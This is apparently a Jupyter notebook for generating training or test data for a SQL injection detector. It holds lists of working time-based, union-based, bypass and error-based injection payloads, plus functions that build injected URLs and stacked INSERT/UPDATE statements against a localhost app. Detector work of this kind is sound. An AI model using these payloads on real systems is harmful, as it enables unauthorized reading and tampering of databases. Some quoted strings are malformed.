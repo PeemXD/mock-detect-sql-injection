{
 "cells": [
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "plain text inject\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "metadata": {},
   "outputs": [],
   "source": [
    "#Time Based SQL Injection\n",
    "Time_Based =[''' ' ;waitfor delay '0:0:5'-- ''',\n",
    "''' ' );waitfor delay '0:0:5'-- ''',\n",
    "''' ' ;waitfor delay '0:0:5'-- ''',\n",
    "''' ' );waitfor delay '0:0:5'-- ''',\n",
    "''' ' ));waitfor delay '0:0:5'-- ''',\n",
    "''' ' ));waitfor delay '0:0:5'-- ''',\n",
    "''' ' benchmark(10000000,MD5(1))#''',\n",
    "''' ' 1 or benchmark(10000000,MD5(1))#''',\n",
    "''' '(1)r benchmark(10000000,MD5(1))#''',\n",
    "''' ' or benchmark(10000000,MD5(1))#''',\n",
    "''' ' 1) or benchmark(10000000,MD5(1))#''',\n",
    "''' ' ) or benchmark(10000000,MD5(1))#''',\n",
    "''' ' ) or benchmark(10000000,MD5(1))#''',\n",
    "''' ' 1)) or benchmark(10000000,MD5(1))#''',\n",
    "''' ' )) or benchmark(10000000,MD5(1))#''',\n",
    "''' ' 1 or pg_sleep(5)-- ''',\n",
    "''' ' (1)r pg_sleep(5)-- ''',\n",
    "''' ' or pg_sleep(5)-- ''',\n",
    "''' ' 1) or pg_sleep(5)-- ''',\n",
    "''' ' ) or pg_sleep(5)-- ''',\n",
    "''' ' ) or pg_sleep(5)-- ''',\n",
    "''' ' 1)) or pg_sleep(5)-- ''',\n",
    "''' ' )) or pg_sleep(5)-- ''',\n",
    "''' ' )) or pg_sleep(5)-- ''',\n",
    "''' ' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe''',\n",
    "''' ' AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'=' ''',\n",
    "''' ' AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)''',\n",
    "''' ' AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)-- ''',\n",
    "''' ' AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#''',\n",
    "''' ' SLEEP(5)#''',\n",
    "''' ' SLEEP(5)-- ''',\n",
    "''' ' SLEEP(5)=\" ''',\n",
    "''' ' (1)r SLEEP(5)''',\n",
    "''' ' (1)r SLEEP(5)#''',\n",
    "''' ' (1)r SLEEP(5)-- ''',\n",
    "''' ' (1)r SLEEP(5)=\"''',\n",
    "''' ' waitfor delay '00:00:05' ''',\n",
    "''' ' waitfor delay '00:00:05'-- ''',\n",
    "''' ' waitfor delay '00:00:05'#''',\n",
    "''' ' benchmark(50000000,MD5(1))''',\n",
    "''' ' benchmark(50000000,MD5(1))-- ''',\n",
    "''' ' benchmark(50000000,MD5(1))#''']\n",
    "\n",
    "\n",
    "\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "metadata": {},
   "outputs": [],
   "source": [
    "#Union Select\n",
    "union_based = [ \n",
    "     \" ' ORDER BY SLEEP(5)#\",\n",
    "     \" ' ORDER BY 1,SLEEP(5)#\",\n",
    "     \" ' ORDER BY 1,SLEEP(5),3#\",\n",
    "     \" ' ORDER BY 1,SLEEP(5),3,4#\",\n",
    "     ''' ' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\"A\")),4,5#''',\n",
    "     \" ' ORDER BY SLEEP(5)-- \",\n",
    "     \" ' ORDER BY 1,SLEEP(5)-- \",\n",
    "     \" ' ORDER BY 1,SLEEP(5),3-- \",\n",
    "     \" ' ORDER BY 1,SLEEP(5),3,4-- \",\n",
    "     ''' ' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(\"A\")),4,5-- ''',\n",
    "     \" ' UNION ALL SELECT 1\",\n",
    "     \" ' UNION ALL SELECT 1,2\",\n",
    "     \" ' UNION ALL SELECT 1,2,3\",\n",
    "     \" ' UNION ALL SELECT 1#\",\n",
    "     \" ' UNION ALL SELECT 1,2#\",\n",
    "     \" ' UNION ALL SELECT 1,2,3#\",\n",
    "     \" ' UNION ALL SELECT 1,2,3,4#\",\n",
    "     \" ' UNION ALL SELECT 1-- \",\n",
    "     \" ' UNION ALL SELECT 1,2-- \",\n",
    "     \" ' UNION ALL SELECT 1,2,3-- \",\n",
    "     \" ' UNION ALL SELECT 1,2,3,4-- \",\n",
    "     \" ' UNION SELECT @@VERSION,SLEEP(5),3\",\n",
    "     \" ' UNION SELECT @@VERSION,SLEEP(5),USER(),4\",\n",
    "     ''' ' UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\"A\")),5''',\n",
    "     ''' ' UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\"A\")),5,6''',\n",
    "     ''' ' UNION SELECT @@VERSION,SLEEP(5),USER(),4#''',\n",
    "     ''' ' UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\"A\")),5#''',\n",
    "     ''' ' UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(\"A\")),5,6#''',\n",
    "     ''' ' UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(\"A\")),NULL,NULL -- ''',\n",
    "     ''' ' UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(\"A\")),NULL,NULL,NULL -- '''\n",
    "     ]\n",
    "\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [],
   "source": [
    "Bypass = [\n",
    "    ''' ' or true -- ''\",\n",
    "    \" ' or true -- \",\n",
    "    \" ' or true -- \",\n",
    "    \" ) or true -- \",\n",
    "    \" ') or true -- \",\n",
    "    \" ' or 'x'='x\",\n",
    "    \" ') or ('x')=('x\",\n",
    "    \" ') or (('x'))=(('x\",\n",
    "    ''' ' or \"x\"=\"x ''',\n",
    "    ''' ') or (\"x\")=(\"x ''',\n",
    "    ''' ')) or ((\"x\"))=((\"x ''',\n",
    "    \" ' or 1=1\",\n",
    "    \" ' or 1=1-- \",\n",
    "    \" ' or 1=1#\",\n",
    "    \" ' or 1=1/*\",\n",
    "    \" ' -- \",\n",
    "    \"' #\",\n",
    "    \"'/*\",\n",
    "    \"' or '1'='1\",\n",
    "    \"' or '1'='1'-- \",\n",
    "    \"' or '1'='1'#\",\n",
    "    \"' or '1'='1'/*\",\n",
    "    \"'or 1=1 or ''='\",\n",
    "    \"' or 1=1\",\n",
    "    \"' or 1=1-- \",\n",
    "    \"' or 1=1#\",\n",
    "    \"' or 1=1/*\",\n",
    "    \"') or ('1'='1\",\n",
    "    \"') or ('1'='1'-- \",\n",
    "    \"') or ('1'='1'#\",\n",
    "    \"') or ('1'='1'/*\",\n",
    "    \"') or '1'='1\",\n",
    "    \"') or '1'='1'-- \",\n",
    "    \"') or '1'='1'#\",\n",
    "    \"') or '1'='1'/*\",\n",
    "    ''' 1234 ' AND 1=0 UNION ALL SELECT 'admin\", '81dc9bdb52d04dc20036dbd8313ed055 ''',\n",
    "    ''' \\\" -- \" ''',\n",
    "    ''' \\\" #''',\n",
    "    ''' \\\"/*''',\n",
    "    ''' \\' Or \\\"1\\\"=\\\"1 ''',\n",
    "    ''' \\' Or \\\"1\\\"=\\\"1\\\"-- ''',\n",
    "    ''' \\' Or \\\"1\\\"=\\\"1\\\"# ''',\n",
    "    ''' \\' Or \\\"1\\\"=\\\"1\\\"/* ''',\n",
    "    ''' \\\"or 1=1 or \\\"\\\"=\\\" ''',\n",
    "    ''' \\' Or 1=1''',\n",
    "    ''' \\' Or 1=1-- ''',\n",
    "    ''' \\' Or 1=1#''',\n",
    "    ''' \\' Or 1=1/*''',\n",
    "    ''' \\\") or (\\\"1\\\"=\\\"1''',\n",
    "    ''' \\\") or (\\\"1\\\"=\\\"1\\\"-- ''',\n",
    "    ''' \\\") or (\\\"1\\\"=\\\"1\\\"#''',\n",
    "    ''' \\\") or (\\\"1\\ '''\n",
    "    ]\n"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Gen-test-case!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "import random"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [],
   "source": [
    "# errorbase -->\n",
    "# Time_Based[]\n",
    "# Bypass[]\n",
    "table_name = [\"employee\",\"customer\",\"service\",\"users\"]\n",
    "user = ['lnwza007','eiei123']"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In band\n",
    "1.error-based\n",
    "2.union"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "metadata": {},
   "outputs": [],
   "source": [
    "errorbase=[\n",
    "\"OR 1=1#\",\n",
    "\"OR 1=0#\",\n",
    "\"OR x=x#\",\n",
    "\"OR x=y#\",\n",
    "\"OR 1=1-- \",\n",
    "\"OR 1=0-- \",\n",
    "\"OR x=x-- \",\n",
    "\"OR x=y-- \",\n",
    "\"OR 3409=3409 AND ('pytW' LIKE 'pytW\",\n",
    "\"OR 3409=3409 AND ('pytW' LIKE 'pytY\",\n",
    "\"HAVING 1=1\",\n",
    "\"HAVING 1=0\",\n",
    "\"HAVING 1=1#\",\n",
    "\"HAVING 1=0#\",\n",
    "\"HAVING 1=1-- \",\n",
    "\"HAVING 1=0-- \",\n",
    "\"AND 1=1\",\n",
    "\"AND 1=0\",\n",
    "\"AND 1=1-- \",\n",
    "\"AND 1=0-- \",\n",
    "\"AND 1=1#\",\n",
    "\"AND 1=0#\",\n",
    "\"AND 1=1 AND '%'='\",\n",
    "\"AND 1=0 AND '%'='\",\n",
    "\"AND 1083=1083 AND (1427=1427\",\n",
    "\"AND 7506=9091 AND (5913=5913\",\n",
    "\"AND 1083=1083 AND ('1427=1427\",\n",
    "\"AND 7506=9091 AND ('5913=5913\",\n",
    "\"AND 7300=7300 AND 'pKlZ'='pKlZ\",\n",
    "\"AND 7300=7300 AND 'pKlZ'='pKlY\",\n",
    "\"AND 7300=7300 AND ('pKlZ'='pKlZ\",\n",
    "\"AND 7300=7300 AND ('pKlZ'='pKlY\",\n",
    "\"AS INJECTX WHERE 1=1 AND 1=1\",\n",
    "\"AS INJECTX WHERE 1=1 AND 1=0\",\n",
    "\"AS INJECTX WHERE 1=1 AND 1=1#\",\n",
    "\"AS INJECTX WHERE 1=1 AND 1=0#\",\n",
    "\"AS INJECTX WHERE 1=1 AND 1=1-- \",\n",
    "\"AS INJECTX WHERE 1=1 AND 1=0-- \",\n",
    "\"WHERE 1=1 AND 1=1\",\n",
    "\"WHERE 1=1 AND 1=0\",\n",
    "\"WHERE 1=1 AND 1=1#\",\n",
    "\"WHERE 1=1 AND 1=0#\",\n",
    "\"WHERE 1=1 AND 1=1-- \",\n",
    "\"WHERE 1=1 AND 1=0-- \",\n",
    "\"ORDER BY 1-- \",\n",
    "\"ORDER BY 2-- \",\n",
    "\"ORDER BY 3-- \",\n",
    "\"ORDER BY 4-- \",\n",
    "\"ORDER BY 5-- \",\n",
    "\"ORDER BY 6-- \",\n",
    "\"ORDER BY 7-- \",\n",
    "\"ORDER BY 8-- \",\n",
    "\"ORDER BY 9-- \",\n",
    "\"ORDER BY 10-- \",\n",
    "\"ORDER BY 11-- \",\n",
    "\"ORDER BY 12-- \",\n",
    "\"ORDER BY 13-- \",\n",
    "\"ORDER BY 14-- \",\n",
    "\"ORDER BY 15-- \",\n",
    "\"ORDER BY 16-- \",\n",
    "\"ORDER BY 17-- \",\n",
    "\"ORDER BY 18-- \",\n",
    "\"ORDER BY 19-- \",\n",
    "\"ORDER BY 20-- \",\n",
    "\"ORDER BY 21-- \",\n",
    "\"ORDER BY 22-- \",\n",
    "\"ORDER BY 23-- \",\n",
    "\"ORDER BY 24\",\n",
    "\"ORDER BY 25\",\n",
    "\"ORDER BY 26\",\n",
    "\"ORDER BY 27\",\n",
    "\"ORDER BY 28\",\n",
    "\"ORDER BY 29\",\n",
    "\"ORDER BY 30\",\n",
    "\"ORDER BY 31337\",\n",
    "\"RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='\",\n",
    "\"RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='\",\n",
    "\"IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl-- \",\n",
    "\"IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl-- \",\n",
    "\"%' AND 8310=8310 AND '%'='\",\n",
    "\"%' AND 8310=8311 AND '%'='\",\n",
    "\"and (select substring(@@version,1,1))='X'\",\n",
    "\"and (select substring(@@version,1,1))='M'\",\n",
    "\"and (select substring(@@version,2,1))='i'\",\n",
    "\"and (select substring(@@version,2,1))='y'\",\n",
    "\"and (select substring(@@version,3,1))='c'\",\n",
    "\"and (select substring(@@version,3,1))='S'\",\n",
    "\"and (select substring(@@version,3,1))='X'\"]\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\"lnwza007 ' ORDER BY 3-- \",\n",
       " \"eiei123 ' ORDER BY 26\",\n",
       " \"eiei123 ' OR 1=0#\",\n",
       " \"eiei123 ' and (select substring(@@version,2,1))='y'\",\n",
       " \"lnwza007 ' AS INJECTX WHERE 1=1 AND 1=0--\",\n",
       " \"lnwza007 ' %' AND 8310=8310 AND '%'='\",\n",
       " \"lnwza007 ' ORDER BY 12-- \",\n",
       " \"lnwza007 ' HAVING 1=1-- \",\n",
       " \"eiei123 ' ORDER BY 10-- \",\n",
       " \"lnwza007 ' HAVING 1=0#\"]"
      ]
     },
     "execution_count": 35,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "random_data(errorbase)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [],
   "source": [
    "def random_data(list_data):\n",
    "    BP_gen=[]\n",
    "    for i in range(10) :\n",
    "        BP_gen.append(user[random.randint(0, len(user)-1)]+\" ' \"  +\n",
    "        list_data[random.randint(0, len(list_data)-1)] )\n",
    "    return BP_gen"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "URL\n",
    "(finished)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "url= \"http://localhost:3000/employee?id=\"\n",
    "see_able_col=[\"employee_id\" ,\n",
    "    \"prefixname\" ,\n",
    "    \"fname\",\n",
    "    \"lname\" ,\n",
    "    \"nickname\" ,\n",
    "    \"email\",\n",
    "    \"tel\" ,\n",
    "    \"work_background\" ,\n",
    "    \"graduation_certificate\" ,\n",
    "    \"address\" ,\n",
    "    \"id_card\" ,\n",
    "    \"house_registration\" ]\n",
    "unsee_col=[\"price\",\n",
    "            \"name\",\n",
    "            \"tel\",\n",
    "            \"email\",\n",
    "            \"lname\",\n",
    "            \"fname\",\n",
    "            \"customer_id\",\n",
    "            \"username\",\n",
    "            \"password\"\n",
    "            ]\n",
    "see_able_value= [('E001\", 'Mr.\", 'bobo1\", 'two1\", 'baba1\", 'E001@gmail.com\", '0123456781' , 'companyA, companyB\", 'XAU\", '123 r.xxxxx 50200\", '1530302340921\", '123 r.xxxxx 54000'), \n",
    "       ('E002\", 'Mr.\", 'bobo2\", 'two2\", 'baba2\", 'E002@gmail.com\", '0123456782' , 'companyA, companyB\", 'XAU\", '123 r.xxxxx 50200\", '1530302340922\", '123 r.xxxxx 54000'), \n",
    "       ('E003\", 'Mr.\", 'bobo3\", 'two3\", 'baba3\", 'E003@gmail.com\", '0123456783' , 'companyA, companyB\", 'XAU\", '123 r.xxxxx 50200\", '1530302340923\", '123 r.xxxxx 54000'), \n",
    "       ('E004\", 'Mr.\", 'bobo4\", 'two4\", 'baba4\", 'E004@gmail.com\", '0123456784' , 'companyA, companyB\", 'XAU\", '123 r.xxxxx 50200\", '1530302340924\", '123 r.xxxxx 54000'), \n",
    "       ('E005\", 'Mr.\", 'bobo5\", 'two5\", 'baba5\", 'E005@gmail.com\", '0123456785' , 'companyA, companyB\", 'XAU\", '123 r.xxxxx 50200\", '1530302340925\", '123 r.xxxxx 54000')]\n",
    "unsee_value={\"price\":['100\",'200\",'300\",'400'],\n",
    "            \"name\":['A\",'B\",'C\",'D'],\n",
    "            \"tel\":[\"0123456781\", \"0123456782\"],\n",
    "            \"email\":['E001@gmail.com\", 'E002@gmail.com'],\n",
    "            \"lname\":['memo1\", 'memo2'],\n",
    "            \"fname\":['one1\", 'one2'],\n",
    "            \"customer_id\":['C001\",'C002'],\n",
    "            \"username\":['lnwza007\",'eiei123'],\n",
    "            \"password\":['123\",'123']}\n",
    "\n",
    "unsee_table =[\"users\",\"service\",\"customer\"]\n",
    "\n",
    "table_value ={\"users\":[\"username\",\"password\"],\n",
    "              \"service\":[\"name\",\"price\"],\n",
    "              \"customer\":[\"fname\",\"customer_id\",\"lname\",\"email\",\"tl\"]\n",
    "            }\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 114,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "service\n",
      "price\n",
      "100\n"
     ]
    }
   ],
   "source": [
    "unsee_t=unsee_table[random.randint(0, len(unsee_table)-1)]\n",
    "print(unsee_t)\n",
    "table_V=table_value[unsee_t][random.randint(0, len(table_value[unsee_t])-1)]\n",
    "print(table_V)\n",
    "unsee_v=unsee_value[table_V][random.randint(0, len(unsee_value[table_V])-1)]\n",
    "\n",
    "print(unsee_v)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "metadata": {},
   "outputs": [],
   "source": [
    "def random_urldata(url,list_data,value):\n",
    "    gen=[]\n",
    "    for i in range(10) :\n",
    "        random_table_value=random.randint(0, len(value)-1)\n",
    "        gen.append(url+(value[random_table_value][0])\n",
    "        +list_data[random.randint(0, len(list_data)-1)])\n",
    "    return gen"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 60,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['http://localhost:3000/employee?id=E001AND 1=0-- ',\n",
       " 'http://localhost:3000/employee?id=E005AND 1=0#',\n",
       " 'http://localhost:3000/employee?id=E001ORDER BY 2-- ',\n",
       " 'http://localhost:3000/employee?id=E003ORDER BY 10-- ',\n",
       " 'http://localhost:3000/employee?id=E005OR x=x#',\n",
       " 'http://localhost:3000/employee?id=E001IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl-- ',\n",
       " 'http://localhost:3000/employee?id=E001AND 1=1',\n",
       " \"http://localhost:3000/employee?id=E002AND 1=0 AND '%'='\",\n",
       " 'http://localhost:3000/employee?id=E004ORDER BY 14-- ',\n",
       " \"http://localhost:3000/employee?id=E005AND 7506=9091 AND ('5913=5913\"]"
      ]
     },
     "execution_count": 60,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "random_urldata(url,errorbase,see_able_value)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "def randomunion_urldata(url,list_data,value):\n",
    "    gen=[]\n",
    "    for i in range(20) :\n",
    "        random_table_value=random.randint(0, len(value)-1)\n",
    "        gen.append(url+(value[random_table_value][0])\n",
    "        +list_data[random.randint(0, len(list_data )-1)])\n",
    "    return gen"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "ename": "NameError",
     "evalue": "name 'url' is not defined",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mNameError\u001b[0m                                 Traceback (most recent call last)",
      "Cell \u001b[1;32mIn[9], line 1\u001b[0m\n\u001b[1;32m----> 1\u001b[0m randomunion_urldata(url,union_based ,see_able_value)\n",
      "\u001b[1;31mNameError\u001b[0m: name 'url' is not defined"
     ]
    }
   ],
   "source": [
    "randomunion_urldata(url,union_based ,see_able_value)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "def randomunionWrealdata_urldata(url,value,table_value,unsee_table,unsee_value):\n",
    "    gen=[]\n",
    "    for i in range(20) :\n",
    "        unsee_t=unsee_table[random.randint(0, len(unsee_table)-1)] #select table\n",
    "        table_V=table_value[unsee_t][random.randint(0, len(table_value[unsee_t])-1)] # colum\n",
    "        unsee_v=unsee_value[table_V][random.randint(0, len(unsee_value[table_V])-1)] # value in that column\n",
    "        random_table_value=random.randint(0, len(value)-1)\n",
    "        gen.append(url+(value[random_table_value][0])+\" ' \"\n",
    "        +\"UNION SELECT \"+ unsee_t + \" \" + \"WHERE \" +table_V+ \" = \"+ unsee_v)\n",
    "    return gen"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['http://localhost:3000/employee?id=E001 UNION SELECT customer WHERE lname = memo2',\n",
       " 'http://localhost:3000/employee?id=E002 UNION SELECT customer WHERE tel = 0123456782',\n",
       " 'http://localhost:3000/employee?id=E004 UNION SELECT service WHERE name = B',\n",
       " 'http://localhost:3000/employee?id=E005 UNION SELECT customer WHERE fname = one2',\n",
       " 'http://localhost:3000/employee?id=E003 UNION SELECT service WHERE price = 200',\n",
       " 'http://localhost:3000/employee?id=E002 UNION SELECT customer WHERE fname = one1',\n",
       " 'http://localhost:3000/employee?id=E004 UNION SELECT customer WHERE fname = one1',\n",
       " 'http://localhost:3000/employee?id=E005 UNION SELECT service WHERE name = A',\n",
       " 'http://localhost:3000/employee?id=E004 UNION SELECT service WHERE name = D',\n",
       " 'http://localhost:3000/employee?id=E002 UNION SELECT users WHERE password = 123',\n",
       " 'http://localhost:3000/employee?id=E003 UNION SELECT service WHERE name = D',\n",
       " 'http://localhost:3000/employee?id=E002 UNION SELECT service WHERE price = 200',\n",
       " 'http://localhost:3000/employee?id=E003 UNION SELECT users WHERE password = 123',\n",
       " 'http://localhost:3000/employee?id=E004 UNION SELECT users WHERE username = eiei123',\n",
       " 'http://localhost:3000/employee?id=E003 UNION SELECT service WHERE price = 200',\n",
       " 'http://localhost:3000/employee?id=E003 UNION SELECT service WHERE name = A',\n",
       " 'http://localhost:3000/employee?id=E002 UNION SELECT service WHERE price = 300',\n",
       " 'http://localhost:3000/employee?id=E005 UNION SELECT users WHERE username = lnwza007',\n",
       " 'http://localhost:3000/employee?id=E005 UNION SELECT service WHERE name = D',\n",
       " 'http://localhost:3000/employee?id=E005 UNION SELECT service WHERE name = D']"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "randomunionWrealdata_urldata(url,see_able_value,table_value,unsee_table,unsee_value)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 110,
   "metadata": {},
   "outputs": [],
   "source": [
    "import string\n",
    "import random\n",
    "\n",
    "showList = [\"DATABASES\", \"TABLES\", \"COLUME\"]\n",
    "\n",
    "last = [\"#\", \"# \", \"-- \"]\n",
    "table =[\"users\",\"service\",\"customer\", \"employee\"]\n",
    "\n",
    "table_value ={\"users\":[\"username\",\"password\"],\n",
    "              \"service\":[\"name\",\"price\"],\n",
    "              \"customer\":[\"fname\",\"customer_id\",\"lname\",\"email\",\"tel\"],\n",
    "              \"employee\":[\"employee_id\", \"prefixname\", \"fname\", \"lname\", \"nickname\", \"email\", \"tel\", \"work_background\", \"graduation_certificate\", \"address\", \"id_card\", \"house_registration\"]\n",
    "            }\n",
    "\n",
    "def generate_random_string(length: int) -> str:\n",
    "    letters = string.ascii_letters + string.digits\n",
    "    return ''.join(random.choice(letters) for i in range(length))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 129,
   "metadata": {},
   "outputs": [],
   "source": [
    "def randomInsert(table, table_value, last):\n",
    "    gen=[]\n",
    "    for i in range(10) :\n",
    "        random_table=table[random.randint(0, len(table)-1)]\n",
    "        random_last=last[random.randint(0, len(last)-1)]\n",
    "        gen.append(\"';\"+\" INSERT INTO \" + random_table + \"(\")\n",
    "        numOfParam=random.randint(1, len(table_value[random_table])-1)\n",
    "        for j in range(numOfParam) :\n",
    "            while True:\n",
    "                random_table_value=table_value[random_table][random.randint(0, len(table_value[random_table])-1)]\n",
    "                if random_table_value not in gen[i]:\n",
    "                    break\n",
    "                continue \n",
    "            gen[i] += random_table_value\n",
    "            if j != numOfParam-1 :\n",
    "                gen[i] += \", \"\n",
    "        gen[i] += \") VALUES(\"\n",
    "        for j in range(numOfParam) :\n",
    "            random_string=generate_random_string(random.randint(1, 15))\n",
    "            gen[i] += random_string\n",
    "            if j != numOfParam-1 :\n",
    "                gen[i] += \", \"\n",
    "        gen[i] += \")\" + random_last\n",
    "    return gen"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 130,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\"';  INSERT INTO service(name) VALUES(y45I75Lh)-- \",\n",
       " \"';  INSERT INTO users(username) VALUES(pBZxYwceB0rC)-- \",\n",
       " \"';  INSERT INTO customer(email, tel, fname, lname) VALUES(LH, KeKt4SfW2VA0, DS5SayGDA, JMRfQWMXn)#\",\n",
       " \"';  INSERT INTO service(name) VALUES(tKiyCa465jek)# \",\n",
       " \"';  INSERT INTO customer(lname, tel) VALUES(uuRuylzespkK, U2lbRcVdB7R)#\",\n",
       " \"';  INSERT INTO employee(address, graduation_certificate, lname, house_registration, work_background, employee_id, email, fname, nickname, prefixname, id_card) VALUES(7L5dzm, CEwpirZxfIheRJp, x, B, kHoUh4Ws0DQ, FThMDoDDeoMVHZ, bNro3RcKGQy, P, UpIX4qggy9sBc, 7tqvOlXxPS6an, rEg)-- \",\n",
       " \"';  INSERT INTO users(password) VALUES(qMZslx82)-- \",\n",
       " \"';  INSERT INTO users(password) VALUES(6xIiChT)# \",\n",
       " \"';  INSERT INTO users(username) VALUES(kfowoRlpKbnr)# \",\n",
       " \"';  INSERT INTO users(password) VALUES(jg)-- \"]"
      ]
     },
     "execution_count": 130,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "randomInsert(table, table_value, last)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 127,
   "metadata": {},
   "outputs": [],
   "source": [
    "def randomUpdate(table, table_value, last):\n",
    "    gen=[]\n",
    "    for i in range(10) :\n",
    "        random_table=table[random.randint(0, len(table)-1)]\n",
    "        random_last=last[random.randint(0, len(last)-1)]\n",
    "        gen.append(\"';\" + \" UPDATE \" + random_table + \" SET \")\n",
    "        numOfParam=random.randint(1, len(table_value[random_table])-1)\n",
    "        for j in range(numOfParam) :\n",
    "            while True:\n",
    "                random_table_value=table_value[random_table][random.randint(0, len(table_value[random_table])-1)]\n",
    "                if random_table_value not in gen[i]:\n",
    "                    break\n",
    "                continue \n",
    "            random_string=generate_random_string(random.randint(1, 15))\n",
    "            gen[i] += random_table_value + \" = \" + random_string\n",
    "            if j != numOfParam-1 :\n",
    "                gen[i] += \", \"\n",
    "        random_table_value2=table_value[random_table][random.randint(0, len(table_value[random_table])-1)]\n",
    "        random_string2=generate_random_string(random.randint(1, 15))\n",
    "        gen[i] += \" WHERE \" + random_table_value2 + \" = \" + random_string2 +random_last\n",
    "        \n",
    "    return gen"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 128,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\"'; UPDATE customer SET fname = Xl2ISthB2g, tel = bHbLdeGBGvIs WHERE lname = 7u4qkJih#\",\n",
       " \"'; UPDATE customer SET customer_id = RrXVECPcRh, fname = 44dl WHERE email = LdAzELQBbEK1cz9# \",\n",
       " \"'; UPDATE customer SET tel = VZ9c5iyY6, lname = zW7, customer_id = xg305wlcdL WHERE email = Ykdu1eUc# \",\n",
       " \"'; UPDATE service SET name = QyPJkEy9KMwmpEw WHERE price = TXdgOlQ75# \",\n",
       " \"'; UPDATE employee SET email = tLinh4MN6SriC, nickname = JIyTZuPG3SmEU, work_background = 8Vyn4iM869mO, prefixname = QWNchLYu3g03, address = 1IB7ePjP95, id_card = dz4yB, lname = 0LEnpv8aKNglBO WHERE lname = c4FGFT48Nu7x4#\",\n",
       " \"'; UPDATE service SET price = zM9gvtp1Sq3uDNV WHERE name = wala60wLoMkkNbL-- \",\n",
       " \"'; UPDATE customer SET fname = MugablH5WI, customer_id = 7tnv95WD, tel = y0pUa, lname = TxySbC0sKrTqoS WHERE email = xlOXdKg-- \",\n",
       " \"'; UPDATE users SET password = JDxoEIpnzFO WHERE password = lVJrPIXDCUgq-- \",\n",
       " \"'; UPDATE customer SET email = nCZ3zHGEpgffR, lname = 1FF, fname = YjW8B, customer_id = fzG5vAN7 WHERE fname = IGKHNcWHKawM# \",\n",
       " \"'; UPDATE users SET username = S7 WHERE password = UeK8-- \"]"
      ]
     },
     "execution_count": 128,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "randomUpdate(table, table_value, last)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 131,
   "metadata": {},
   "outputs": [],
   "source": [
    "def randomDelete(table, table_value, last):\n",
    "    gen=[]\n",
    "    for i in range(10) :\n",
    "        random_table=table[random.randint(0, len(table)-1)]\n",
